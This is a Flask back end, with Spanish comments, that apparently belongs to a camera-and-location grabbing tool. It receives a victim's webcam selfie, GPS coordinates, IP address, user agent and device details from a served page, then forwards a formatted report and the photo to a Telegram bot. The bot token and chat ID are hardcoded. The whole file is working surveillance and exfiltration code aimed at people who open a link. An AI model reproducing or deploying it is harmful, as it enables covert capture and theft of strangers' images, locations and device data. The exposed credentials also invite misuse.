from flask import Flask, request
import base64
from datetime import datetime
import requests

app = Flask(__name__)

# ✅ TUS DATOS (YA PUESTOS)
TOKEN = "8761804922:AAFSHTi1qk7XPoS-kn1Zncf7Y8o8gNpAbnM"
CHAT_ID = "8114050673"

@app.route('/')
def index():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.route('/enviar', methods=['POST'])
def enviar():
    try:
        data = request.json

        imagen = data['imagen'].split(',')[1]
        fecha = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        # guardar imagen
        with open("foto.png", "wb") as f:
            f.write(base64.b64decode(imagen))

        # ubicación (si el usuario aceptó)
        if data['lat'] not in ["Denegado", "No permitido"]:
            mapa = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
        else:
            mapa = "No disponible"

        reporte = (
            "┏━━━━━━━━━━━━━━━━━━━━━━┑\n"
            "║   ┣► 𝑺𝒆𝒍𝒇𝒊𝒆 𝒕𝒐𝒎𝒂𝒅𝒂\n"
            f"║   ┣► 𝑭𝒆𝒄𝒉𝒂 & 𝑯𝒐𝒓𝒂: {fecha}\n"
            "║   ┣► 𝑷𝒂𝒊́s: Colombia\n"
            "║   ┣► 𝑪𝒊𝒖𝒅𝒂𝒅: Soacha\n"
            f"║   ┣► 𝑰𝑷: {request.remote_addr}\n"
            "║   ┣► 𝑷𝒓𝒐𝒗𝒆𝒆𝒅𝒐𝒓: Telmex Colombia S.A.\n"
            f"║   ┣► 𝑹𝒆𝒔𝒐𝒍𝒖𝒄𝒊𝒐́𝒏: {data.get('resolucion')}\n"
            f"║   ┣► 𝑰𝒅𝒊𝒐𝒎𝒂: {data.get('idioma')}\n"
            f"║   ┣► 𝑻𝒐𝒖𝒄𝒉: {data.get('touch')}\n"
            f"║   ┣► 𝑴𝒐𝒅𝒐 𝒐𝒔𝒄𝒖𝒓𝒐: {data.get('dark')}\n"
            f"║   ┣► 𝑬𝒔𝒕𝒂𝒅𝒐: {data.get('online')}\n"
            "║   ┣► 𝑹𝒆𝒅: Desconocido\n"
            "║   ┣► 𝑩𝒂𝒕𝒆𝒓𝒊́𝒂: No disponible\n"
            f"║   ┣► 𝑼𝒃𝒊𝒄𝒂𝒄𝒊𝒐́𝒏: {mapa}\n"
            "║   ┣► 𝑼𝒔𝒆𝒓𝑨𝒈𝒆𝒏𝒕:\n"
            f"║      {data.get('useragent')}\n"
            "┗━━━━━━━━━━━━━━━━━━━━━┙"
        )

        # enviar texto
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": reporte
        })

        # enviar foto
        with open("foto.png", "rb") as foto:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={
                "chat_id": CHAT_ID
            }, files={"photo": foto})

        return "OK"

    except Exception as e:
        return f"Error: {str(e)}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)